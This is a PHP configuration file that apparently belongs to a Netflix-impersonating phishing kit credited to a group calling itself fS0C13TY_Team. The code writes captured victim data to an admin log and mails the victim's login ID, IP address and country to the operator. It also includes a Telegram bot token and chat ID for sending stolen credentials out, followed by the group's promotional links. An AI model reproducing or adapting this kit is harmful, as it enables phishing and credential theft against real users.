﻿<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/
$yourmail  = '';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

/**Add Your Api Telegram Token Bellow : **/
$botToken="2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM";
$chatId="1556350571";  

$Our_Name = "FUCKTHISHIT" ; 

$Name_page = "FUCKTHISHIT" ;

$JoinUs_On_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$JoinUs_On_Facebook = "https://www.facebook.com/FsocietyZone/";

$JoinUs_On_telegram = "https://t.me/FUCKTOS0C13TY";



?>
